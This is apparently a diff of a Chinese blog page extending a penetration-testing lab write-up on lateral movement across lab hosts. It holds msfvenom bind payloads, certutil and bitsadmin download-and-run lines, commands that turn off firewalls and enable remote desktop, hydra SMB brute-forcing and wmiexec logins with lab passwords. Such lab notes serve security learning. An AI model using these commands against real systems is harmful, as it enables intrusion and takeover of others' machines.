@@ -60,8 +60,18 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206115617835.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206114807676.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240206132317942.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172111891.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172404222.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172444742.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173040151.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173448644.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173454362.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173545693.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207175958569.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207181721267.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207182227586.png">
 <meta property="article:published_time" content="2024-02-02T02:59:23.000Z">
-<meta property="article:modified_time" content="2024-02-06T05:32:09.055Z">
+<meta property="article:modified_time" content="2024-02-07T16:49:08.407Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="靶场记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -265,7 +275,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.2k words
+          5.9k words
         
       </span>
     
@@ -276,7 +286,7 @@
         
         
         
-          27 mins
+          50 mins
         
       </span>
     
@@ -500,7 +510,149 @@
 
 <p>都将进程迁移到lsaa.exe</p>
 <p>然后联动cs</p>
+<p>传递不了</p>
+<p>关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs \">netsh advfirewall set publicprofile state off<br></code></pre></td></tr></table></figure>
+
+<p>打开远程桌面服务</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试连接连接不上</p>
+<p>发现命令执行收到很大的限制</p>
 </li>
+<li><p>使用wmiexec</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains wmiexec<span class="hljs-selector-class">.py</span> <span class="hljs-string">&#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br>proxychains wmiexec<span class="hljs-selector-class">.py</span> <span class="hljs-string">&#x27;administrator:123qwe!ASD@192.168.93.20&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+</li>
+<li><p>发现100存在python2</p>
+<p>生成一个正向的payload ，然后使用100主机的http.server服务</p>
+<p>查看20 主机是32 or 64位机器</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172111891.png" srcset="/img/loading.gif" lazyload alt="image-20240207172111891"></p>
+<p>为了保险我省32和64一样生成了一个</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>bind_tcp  lport=<span class="hljs-number">10668</span> -f exe -o bind32.exe<br>msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>bind_tcp  lport=<span class="hljs-number">10669</span> -f exe -o bind.exe<br></code></pre></td></tr></table></figure>
+
+<p>然后使用http.server传输文件（也可以使用scp）都比较方便</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172404222.png" srcset="/img/loading.gif" lazyload alt="image-20240207172404222"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207172444742.png" srcset="/img/loading.gif" lazyload alt="image-20240207172444742">再由100开启http服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
+
+<p>在windows 上下载文件的方式有很多，现在使用certutil</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">下载文件<br>certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/win7.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\win7.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\win7.<span class="hljs-keyword">exe</span><br>清楚缓存<br>certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/win7.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">delete</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173040151.png" srcset="/img/loading.gif" lazyload alt="image-20240207173040151"></p>
+<p>拿下20</p>
+<p>换一个进程</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173448644.png" srcset="/img/loading.gif" lazyload alt="image-20240207173448644"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173454362.png" srcset="/img/loading.gif" lazyload alt="image-20240207173454362"></p>
+<p>现在的权限就是system了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207173545693.png" srcset="/img/loading.gif" lazyload alt="image-20240207173545693"></p>
+<p>同理对10主机、</p>
+<p>但是一直一直利用不上</p>
+</li>
+<li><p>尝试对20 联动cs</p>
+<p>失败</p>
+</li>
+<li><p>尝试cs 的payload </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207175958569.png" srcset="/img/loading.gif" lazyload alt="image-20240207175958569"></p>
+<p>不知道为什么上线不了cs</p>
+</li>
+<li><p>对20主机开启远程桌面</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207181721267.png" srcset="/img/loading.gif" lazyload alt="image-20240207181721267"></p>
+<p>发现成功，但是还有10主机，这个应该是一个域控</p>
+</li>
+<li><p>尝试使用20主机(winserver 2008)作为smb服务器</p>
+</li>
+</ol>
+<p>   重新创建一个bind payload</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240207182227586.png" srcset="/img/loading.gif" lazyload alt="image-20240207182227586"></p>
+<p>   然后传递给100主机</p>
+<p>   老方法下载payload</p>
+   <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">93.100</span>:<span class="hljs-number">8080</span>/bind32.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\bind32.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\bind32.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+<p>   确实下载了，但是不能执行</p>
+<p>   尝试关闭防火墙</p>
+   <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>
+
+<p>   还是没有用，那就只有使用前面反弹的shell了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>全部主机都上线了，但是域控查找了资料好像都没有上线，这个是一个遗憾</p>
+<h2 id="信息收集部分"><a href="#信息收集部分" class="headerlink" title="信息收集部分"></a>信息收集部分</h2><ol>
+<li><p>很意外的mysql是一个弱口令，然后直接获取root的权限</p>
+<p>通过信息收集也获取了其他用户的密码</p>
+</li>
+<li><p>信息收集的步骤中<br>对于靶场来说，最重要的就是端口收集了，可以收集到对应的服务，然后通过服务查找相应的漏洞，或者通过通过80web漏洞</p>
+</li>
+<li><p>Joomla的配置文件利用注意添加波浪线</p>
+<p>注意添加用户的方法</p>
+</li>
+</ol>
+<h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><ol>
+<li><p>Joomla 中查找文件，编辑代码的时候，注意需要添加路径</p>
+<p>对模板的利用中，注意将一句话木马写在稍微前面一点不然不能利用</p>
+<p>还有就是有一些文件的话最好不要删除</p>
+</li>
+<li><p>这个部分是有ngnix反向代理</p>
+<p>注意得到的shell是反向代理的客户端的不是主机的</p>
+<p>这个分辨是因为webshell和ssh通一个地址是不一样的shell</p>
+<p>可以直接暂时的关闭ngnix</p>
+</li>
+<li><p>通过ssh连接，靶场直接给密码了，这个应该不会遇到，得学习一下如何绕过ngnix</p>
+</li>
+<li><p>还有就是绕过php disable_function 可以使用蚁剑的插件</p>
+</li>
+<li><p>linux提权的时候使用脏牛进行提权</p>
+</li>
+</ol>
+<h2 id="内网信息收集-1"><a href="#内网信息收集-1" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><ol>
+<li><p>主机存活检测，使用的是fscan</p>
+<p>但是这个有一个好处就是不用自指定其他的参数，全部进行</p>
+<p>如果使用的是nmap的话可以使用</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">主机存活探测<br><span class="hljs-keyword">nmap</span> -sS (SYN扫描) 或 <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sN</span> (NULL扫描) 或 <span class="hljs-keyword">nmap</span> -sF (FIN扫描) 或 <span class="hljs-keyword">nmap</span> -sX (Xmas扫描)<br><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> [目标IP地址或子网掩码/CIDR表示法]<br>某一个主机的端口扫描<br><span class="hljs-keyword">nmap</span> -sT -<span class="hljs-keyword">p</span>- [目标IP或域名]<br>获取操作系统信息<br><span class="hljs-keyword">nmap</span> -O -sV -T4 [目标IP或域名]<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>最主要的还是对每一个主机进行端口扫描</p>
+</li>
+</ol>
+<h2 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h2><p>个人现阶段，思路还不够多</p>
+<ol>
+<li><p>使用msf smb_login</p>
+<p>可以爆破密码，但是密码必须要强大</p>
+</li>
+<li><p>msf单个模块使用代理的方式</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> proxies <span class="hljs-comment">socks5:ip:port</span><br></code></pre></td></tr></table></figure>
+
+<p>或者使用setg全局设置</p>
+</li>
+<li><p>hydra 也可以爆破smb服务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l administrator -P(大写) <span class="hljs-regexp">/home/</span>kali/password.txt(字典路径) <span class="hljs-number">192.168</span>.<span class="hljs-number">93.10</span> smb<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>exploit&#x2F;windows&#x2F;smb&#x2F;psexec</p>
+<p>smb 服务的利用模块</p>
+</li>
+<li><p>wmiexec</p>
+<p>可以反弹shell</p>
+<p>但是感觉有很多限制</p>
+</li>
+<li><p>防火墙</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">关闭防火墙<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br>开启防火墙<br>netsh advfirewall show allprofiles<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用smb服务</p>
+<p>连接的时候需要指定具体的盘符</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>administrator <span class="hljs-string">&quot;123qwe!ASD&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>下载文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>\c<span class="hljs-variable">$</span>\filename save_name <span class="hljs-comment"># 默认保存到当前的文件</span><br><span class="hljs-built_in">copy</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span>\c<span class="hljs-variable">$</span>\bind32_2012.exe bind32_2012.exe<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>文件传输</p>
+<p>除了使用smb服务还可以使用其他的服务</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">93.100</span>:<span class="hljs-number">8080</span>/bind.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\bind.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\bind.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bitsadmin <span class="hljs-regexp">/transfer shell http:/</span><span class="hljs-regexp">/192.168.93.100:8080/</span>bind32.exe C:\bind32.exe;start C:\windows\temp\bind32.exe<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用代理开启远程桌面</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> rdesktop -u administrator -p <span class="hljs-string">&#x27;zxcASDqw123!!&#x27;</span> <span class="hljs-number">192.168.93.10</span> <br></code></pre></td></tr></table></figure></li>
 </ol>
 
                 
